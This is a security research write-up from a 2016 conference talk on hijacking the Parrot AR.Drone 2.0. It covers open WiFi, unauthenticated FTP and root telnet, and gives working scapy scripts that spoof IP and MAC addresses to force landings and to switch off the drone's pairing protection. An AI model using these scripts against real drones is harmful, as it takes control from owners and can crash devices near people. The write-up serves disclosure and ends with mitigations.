# Let's hack a drone!

This is the write-up of my research presented at the Ethical Hacking Conference Budapest in May 2016. You can watch the video on [YouTube](https://www.youtube.com/watch?v=FnYLfeoSKHM) (in Hungarian).
[![Presenting](pics/IMG_6254.jpg?raw=true "")](https://www.youtube.com/watch?v=FnYLfeoSKHM)

## Getting to know the drone

I used the Parrot AR.Drone 2.0 for my research. This drone can be controlled with a mobile app through WiFi. When the drone is powered up it creates a WiFi network (open network, no password), and then the pilot connects to that network with his phone, starts the app and flies the drone. On how to fly the drone, check out this video by Parrot:

[![AR.Drone 2.0 Tutorial video #2 : Pilot](https://img.youtube.com/vi/Hpe-oX-Iy7w/0.jpg)](https://www.youtube.com/watch?v=Hpe-oX-Iy7w)

## Discovery

So the drone uses open WiFi. Let's connect to it with the computer! Run an nmap scan to discover open ports on the drone:

![Nmap scan result](img/nmap.jpg?raw=true "Nmap scan result - `nmap 192.168.1.1`")

## Ftp

Let's try ftp first! Simply just connect to 192.168.1.1 without any username or password, and we have access to the directory of the drone, where it stores the recorded videos! 

![Filezilla](img/filezilla.jpg?raw=true "Ftp access")

## Telnet

As we saw in the nmap scan the drone has a telnet service listening, let's connect to it!

![Telnet access](img/telnet.jpg?raw=true "Telnet access - `telnet 192.168.1.1`")

Wow, it's running linux and we have root access to the device! At this point we could simply issue a `shutdown now` and watch the drone fall down, but that might hurt the drone, so let's find a nicer solution to land it.

## Looking at the communication

Let's fire up Wireshark, and look at the communication between the phone and the drone.

![Wireshark](img/wireshark.jpg?raw=true "Wireshark capture - phone is at 192.168.1.2, drone is at 192.168.1.1")

Wow, Wireshark recognizes the protocol of AR.Drone! Let's look at the details. It is a UDP packet from port 5556 to port 5556. This exact packet has two commands: a `PCMD_MAG` and a `REF`. 

`PCMD_MAG` sets the velocity of the drone in each direction. Since right now the drone is lying on the ground, it sets all numbers to 0. `REF` is used to issue high level commands like 'take off', 'emergency stop/reset' or 'land'. Since it's on the ground now, the phone constantly sends the 'land' command. (Source: [AR.Drone Developer Guide](http://www.robotappstore.com/Files/KB/ARDrone/ARDrone_SDK_1_7_Developer_Guide.pdf))

Both commands have a Sequence Number. This number is used to prevent older commands from being accepted, so the drone only accepts packets with higher sequence number than the previous one. The counter can be reset to 1 by either not sending any control packet to the drone for 2 seconds, or sending a packet with seqNr 1. (The packet with seqNr 1 will be accepted and then the counter is reset.)

## Fake a land packet

What if we send a packet with a very high sequence number? Let's try it! To prevent multiple phones trying to control the drone, the drone only accepts packets from the source IP of the controller. (The controller is defined as the first device which starts sending control packets.) But since it's UDP, we can simply spoof the IP of my phone. I used the python module *scapy* to do this. Make sure you run this code as root, otherwise it won't work.
```python
from scapy.all import *
from time import sleep

srcIP = '192.168.1.2' # my phone's IP
dstIP = '192.168.1.1' # drone's IP
srcPort = 5556 # source port
dstPort = 5556 # destination port

payload = "AT*REF=1000000,290717696\r"
print payload
spoofed_packet = IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
send(spoofed_packet)
```
It takes over the drone and lands it. The owner has no longer control, and he can only get it back by restarting the app (in the case it will send a packet with seqNr 1, which resets the counter). For the demo I extended this code to first send 10 packets with 1000000+ sequence number, then wait for 5 seconds to show the owner has no longer control and then send a packet with seqNr 1 to restore control. You can access this code [here](code/1.py).

Of course we can send other packets in the same way. We can rotate the drone, don't let it land (by constantly sending take-off packets with seqNr 1) or set the velocity to maximum, and smash the drone to the wall. I used the land command for the demo, because that's the easiest (and probably the safest) thing to show.

## Security control?

You could say: that was too easy, there must be some sort of security control which can be enabled by the owner to prevent this attack. In fact, there is, and it's called 'Pairing'. It can be enabled in the settings of the app. Since we have full telnet access to the drone, it was easy to find the setup script of this feature under `/bin/pairing_setup.sh`. This script sets up the following IP tables rules:
```bash
NULL_MAC=00:00:00:00:00:00
if [ $MAC_ADDR != $NULL_MAC ]
then
# Clearing all rules
iptables -P INPUT ACCEPT
iptables -F
# Allowing only owner's traffic
iptables -A INPUT -m mac --mac-source $MAC_ADDR -j ACCEPT
# allowing ICMP (ping), ftp and nfs traffic for everyone.
# Telnet is only allowed for paired user
iptables -A INPUT --protocol icmp -j ACCEPT
#iptables -A INPUT --protocol tcp --dport 23 -j ACCEPT
iptables -A INPUT --protocol tcp --dport 21 -j ACCEPT
iptables -A INPUT --protocol tcp --dport 2049 -j ACCEPT
# Blocking all incoming traffic by default
iptables -P INPUT DROP
else
# Clearing all rules
iptables -F
# Allows incoming connections from anywhere outside
iptables -P INPUT ACCEPT
fi
```
But this doesn't prevent anyone from connecting to the drone's WiFi, the drone will only drop the packets if the MAC address is not the one it is paired with (and if the accessed service is not icmp, ftp or nfs). So of course if we would use the same script as before, that won't work, since the drone would drop our packets. But we can simply spoof the source MAC address too:
```python
from scapy.all import *
from time import sleep

srcIP = '192.168.1.2' # my phone's IP
dstIP = '192.168.1.1' # drone's IP
srcPort = 5556 # source port
dstPort = 5556 # destination port
srcMAC = '58:44:98:13:80:6c' # my phone's MAC
dstMAC = '90:03:b7:e8:55:72' # drone's MAC

payload = "AT*REF=1000000,290717696\r"
print payload
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
sendp(spoofed_packet, iface="wlan0")
```
For the demo I again sent 10 packets, then restored the control after 5 seconds. [Here](code/2.py) is the code.

Of course manually setting the MAC and IP isn't the most convenient thing, so I wrote a script which sniffs for parrot packets, then parses the IP and MAC addresses and send the land packets using those addresses. It is available [here](code/sniff_and_land.py). All you need to do is connect to a Parrot's WiFi and then run the script.

## Turn pairing off

So we saw, that pairing won't stop us from taking over the drone and make it do whatever we want it to do, but it successfully stops us from accessing it via telnet. Of course we could change our MAC address, but I found a way to simply turn off the feature remotely. Let's look at the communication when the feature is enabled:

![Turn on pairing](img/wireshark2.jpg?raw=true "Wireshark capture - Turn on pairing")

So the same UDP based protocol is used to turn on pairing as we just spoofed above! To turn off pairing all we need to do is to set `network:owner_mac` to `00:00:00:00:00:00`. Actually the things are not exactly the same as above, because the CONFIG packet will be only accepted if the previous packet is a CONFIG_IDS with the proper session, user and application id. So first we need to sniff these id's, and then spoof the two control packets (they can be in one UDP packet, as it can be seen in the Wireshark capture. Simply separate them with \r):
```python
from scapy.all import *
from time import sleep

srcIP = '192.168.1.2'
dstIP = '192.168.1.1'
srcPort = 5556
dstPort = 5556
srcMAC = '58:44:98:13:80:6c'
dstMAC = '90:03:b7:e8:55:72'

macfilteroff = "AT*CONFIG_IDS=1,\"6d284a13\",\"6b8ae8b1\",\"96e3654b\"\rAT*CONFIG=2,\"network:owner_mac\",\"00:00:00:00:00:00\"\r" 

payload = macfilteroff
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload

for i in range(1, 10):
	sendp(spoofed_packet, iface="wlan0")
	sleep(0.3);
```
The code is also available [here](code/3.py). The packet is sent 10 times, just to make sure it arrives. Of course the same way we could set the mac to our own mac address, and then the owner has no longer control over the drone. Since the MAC is saved in the config file a simple restart won't affect this attack. The owner needs to reset the drone by pressing the reset button for 10 seconds. (This will restore the config file to the default one, thus turning pairing off.)

## Further research & readings

There is a problem with the last attack: you need to sniff the session, user and application id first, and these are only sent if the user changes some settings. To enforce them being sent we can send a disconnect packet to the phone, and then let it connect back to the drone. After successful connection the phone starts with sending some configs, so then we can easily sniff the ids.

An other attack called [SkyJack](http://samy.pl/skyjack/) was presented by Samy Kamkar. He sends disconnect packets to the phone, and connects to the drone. Then he is the one who was connected to the drone first, so the drone will accept packets only from him.

To prevent these attacks the drone owner have to cross-compile and upload some libraries to the drone to enable WiFi encryption. On how to do it there is a nice conference paper "[Hacking and securing the AR.Drone 2.0 quadcopter - Investigations for improving the security of a toy](https://www.researchgate.net/publication/260420467_Hacking_and_securing_the_ARDrone_20_quadcopter_-_Investigations_for_improving_the_security_of_a_toy)".
